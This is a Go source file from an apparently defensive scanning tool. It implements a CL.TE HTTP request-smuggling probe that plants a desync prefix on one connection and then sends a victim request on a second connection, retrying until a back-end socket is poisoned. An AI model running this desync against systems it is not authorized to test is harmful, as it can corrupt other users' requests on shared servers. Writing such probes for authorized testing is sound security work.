package probe

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
)

// SmuggleChainProbe verifies a CL.TE desync across connections. It plants the
// "0\r\n\r\nG" prefix with one request and then sends a normal victim request
// on a second connection. A front-end that closes each client connection but
// reuses its back-end socket delivers the desynced response to the victim, and
// the victim request line arrives at the back-end prefixed with "G"
// ("GPOST ...").
//
// The probe never dials. Runner supplies a ConnSource bound to one pinned
// session, so both connections share one proxy and one exit IP.
type SmuggleChainProbe struct {
	// VictimMethod defaults to POST: with the CL.TE prefix the back-end sees
	// "G"+method, so POST becomes the GPOST marker.
	VictimMethod string
	VictimPath   string
	// VictimHeaders are added to the victim request verbatim.
	VictimHeaders []rawhttp.Header

	// SuccessContains is the marker a desynced response must contain. The probe
	// does not guess: without a marker it reports evidence and no verdict.
	SuccessContains string

	// Attempts is how many times the two-request chain is tried. A back-end
	// connection pool may need several tries before the victim lands on the
	// poisoned socket. Default 3.
	Attempts int

	Timeout   time.Duration
	Idle      time.Duration
	MaxHeader int64
	MaxBody   int64
}

func (p *SmuggleChainProbe) Name() string { return "smuggling/cl.te-chain" }

// Execute cannot run the chain: the technique needs a second connection by
// definition. Runner detects MultiConnProbe and calls ExecuteMulti.
func (p *SmuggleChainProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	return nil, fmt.Errorf("%w: use ExecuteMulti", ErrMultiConn)
}

// ExecuteMulti plants the prefix, then sends the victim on a fresh connection.
// Each attempt closes both sockets; the poisoned state lives in the front-end's
// back-end pool, which is exactly what the probe is testing.
func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, source ConnSource) (*Result, error) {
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	attempts := p.Attempts
	if attempts <= 0 {
		attempts = 3
	}

	payload, err := (&SmugglingProbe{Variant: VariantCLTE}).build(VariantCLTE, target, "/")
	if err != nil {
		return nil, err
	}
	victim, err := p.renderVictim(target)
	if err != nil {
		return nil, err
	}

	conn, err := source.Dial(ctx)
	if err != nil {
		return nil, fmt.Errorf("probe: dial for payload: %w", err)
	}
	e := newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	defer func() { _ = conn.Close() }()
	idle := orDuration(p.Idle, 2*time.Second)

	for attempt := 1; attempt <= attempts; attempt++ {
		if err := ctx.Err(); err != nil {
			return e.finish(), err
		}
		if attempt > 1 {
			// The previous attempt ended on the victim socket. A new attempt
			// must plant its prefix on a fresh client connection; writing the
			// payload into the victim stream would test nothing and would
			// corrupt any buffered response.
			_ = conn.Close()
			conn, err = source.Dial(ctx)
			if err != nil {
				return e.finish(), fmt.Errorf("probe: dial for payload (attempt %d): %w", attempt, err)
			}
			e.attach(conn)
		}
		if err := e.write(payload); err != nil {
			return e.finish(), fmt.Errorf("probe: payload write (attempt %d): %w", attempt, err)
		}
		if _, err := e.read(); err != nil && !isTimeout(err) {
			return e.finish(), fmt.Errorf("probe: payload read (attempt %d): %w", attempt, err)
		}

		// The desync is carried by the front-end's back-end connection, so the
		// victim goes to a new client connection. Close the first socket first:
		// keeping it open would only tie up a slot the front-end already closed.
		_ = conn.Close()
		conn, err = source.Dial(ctx)
		if err != nil {
			return e.finish(), fmt.Errorf("probe: dial for victim (attempt %d): %w", attempt, err)
		}
		e.attach(conn)

		if err := e.write(victim); err != nil {
			return e.finish(), fmt.Errorf("probe: victim write (attempt %d): %w", attempt, err)
		}
		after := e.readUntilIdle(idle)

		if p.SuccessContains != "" {
			for _, r := range after {
				if p.markerIn(r) {
					e.addFinding(Finding{
						Kind:       "smuggle_confirmed",
						Confidence: ConfidenceHigh,
						Detail:     fmt.Sprintf("victim response contained %q: its request line was prefixed by the smuggled byte", p.SuccessContains),
						Response:   r.Seq,
					})
					return e.finish(), nil
				}
			}
		}
	}

	e.addFinding(Finding{
		Kind:       "smuggle_chain_unconfirmed",
		Confidence: ConfidenceLow,
		Detail:     fmt.Sprintf("marker %q did not appear after %d attempts", p.SuccessContains, attempts),
	})
	return e.finish(), nil
}

func (p *SmuggleChainProbe) renderVictim(target Target) ([]byte, error) {
	method := p.VictimMethod
	if method == "" {
		method = "POST"
	}
	path := p.VictimPath
	if path == "" {
		path = target.RequestPath()
	}
	headers := []rawhttp.Header{
		{Key: "Host", Value: target.HostHeader()},
		{Key: "User-Agent", Value: "omnislash-probe/1"},
		{Key: "Content-Length", Value: "0"},
		{Key: "Connection", Value: "keep-alive"},
	}
	headers = append(headers, p.VictimHeaders...)
	return render(requestSpec{Method: method, Path: path, Headers: headers})
}

func (p *SmuggleChainProbe) markerIn(r *Response) bool {
	if r == nil {
		return false
	}
	if strings.Contains(r.Body, p.SuccessContains) || strings.Contains(r.Reason, p.SuccessContains) {
		return true
	}
	for _, h := range r.Headers {
		if strings.Contains(h.Value, p.SuccessContains) {
			return true
		}
	}
	return false
}
